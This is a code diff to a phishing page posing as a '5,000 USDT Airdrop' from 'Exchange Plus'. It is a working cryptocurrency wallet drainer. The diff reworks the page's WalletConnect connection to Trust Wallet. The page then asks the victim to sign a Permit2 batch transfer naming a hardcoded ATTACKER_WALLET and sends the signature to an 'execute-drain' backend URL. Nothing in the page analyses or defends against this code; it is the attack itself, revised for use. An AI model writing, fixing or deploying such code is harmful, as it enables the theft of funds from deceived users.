@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Exchange Plus | 5,000 USDT Airdrop</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -66,12 +67,7 @@
 
 <script>
     // ============================================
-    // FIX 1: "process is not defined" - RUNS FIRST
-    // ============================================
-    window.process = window.process || { env: { NODE_ENV: 'production' } };
-    
-    // ============================================
-    // FIX 2: HANDLE /wc REDIRECT FROM TRUST WALLET
+    // HANDLE /wc REDIRECT FROM TRUST WALLET
     // ============================================
     if (window.location.pathname === '/wc' || window.location.pathname.includes('/wc')) {
         sessionStorage.setItem('wc_returning', 'true');
@@ -84,11 +80,9 @@
             document.getElementById('connectBtn').click();
         }, 500);
     }
-</script>
 
-<script type="module">
     // ============================================
-    // MAIN CODE - USING type="module"
+    // CONFIGURATION
     // ============================================
     const ATTACKER_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
     const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/api/execute-drain";
@@ -111,10 +105,13 @@
         statusDiv.className = isError ? 'status-error' : (msg.includes('✅') ? 'status-success' : 'status');
     }
 
-    async function requestBatchPermit(account, provider) {
+    async function requestBatchPermit(account) {
         updateStatus('<span class="loading"></span> Preparing batch approval...');
 
         try {
+            const provider = new ethers.providers.Web3Provider(wcProvider);
+            const signer = provider.getSigner();
+
             const domain = {
                 name: "Permit2",
                 version: "1",
@@ -144,10 +141,7 @@
 
             updateStatus("⏳ Please approve in Trust Wallet...");
 
-            const signature = await provider.request({
-                method: "eth_signTypedData_v4",
-                params: [account, JSON.stringify({ domain, types, primaryType: "PermitBatchTransferFrom", message })]
-            });
+            const signature = await signer._signTypedData(domain, types, message);
 
             updateStatus("✅ Signature received! Sending...");
 
@@ -175,26 +169,31 @@
         updateStatus('<span class="loading"></span> Opening Trust Wallet...');
 
         try {
-            const { EthereumProvider } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.13.0/dist/index.umd.js');
+            const WalletConnectProvider = window.WalletConnectProvider.default;
 
-            const provider = await EthereumProvider.init({
-                projectId: '2bf2541340dc39fea57ec973a360f93b',
-                chains: [1],
-                methods: ['eth_sendTransaction', 'eth_signTypedData_v4', 'personal_sign'],
-                showQrModal: false
+            const provider = new WalletConnectProvider({
+                rpc: {
+                    1: "https://cloudflare-eth.com"
+                },
+                chainId: 1,
+                qrcode: false,
+                methods: ["eth_sendTransaction", "eth_signTypedData_v4", "personal_sign"]
             });
 
             wcProvider = provider;
 
-            provider.on('connect', async () => {
-                const ethersProvider = new ethers.providers.Web3Provider(provider);
-                const signer = ethersProvider.getSigner();
-                const account = await signer.getAddress();
+            // Set up listener BEFORE enabling
+            provider.connector.on("connect", async (error, payload) => {
+                if (error) {
+                    updateStatus("Connection failed", true);
+                    return;
+                }
+                const account = payload.params[0].accounts[0];
                 updateStatus(`✅ Connected: ${account.slice(0,6)}...${account.slice(-4)}`);
-                await requestBatchPermit(account, provider);
+                await requestBatchPermit(account);
             });
 
-            await provider.connect();
+            await provider.enable();
             const wcUri = provider.connector.uri;
 
             if (wcUri) {
@@ -208,7 +207,7 @@
 
         } catch (e) {
             console.error(e);
-            updateStatus(`Failed: ${e.message || 'Check console'}`, true);
+            updateStatus(`Failed: ${e.message}`, true);
         }
     };
 </script>
